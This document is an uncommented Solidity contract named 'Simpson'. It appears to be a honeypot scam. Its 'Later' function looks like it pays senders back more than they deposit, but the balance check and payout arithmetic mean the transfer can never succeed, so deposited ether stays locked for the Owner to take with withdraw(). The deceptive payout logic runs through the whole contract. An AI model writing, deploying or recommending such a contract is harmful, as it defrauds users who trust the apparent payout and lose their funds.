 

 
 
 
 
 
 
 
 
pragma solidity ^0.4.18;

contract Simpson
{
    string public constant version = "1.0";
    address public Owner = msg.sender;

    function() public payable {}
   
    function withdraw() payable public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Later(address _address)  public payable {
        if (msg.value >= this.balance) {        
            _address.transfer(this.balance + msg.value);
        }
    }
}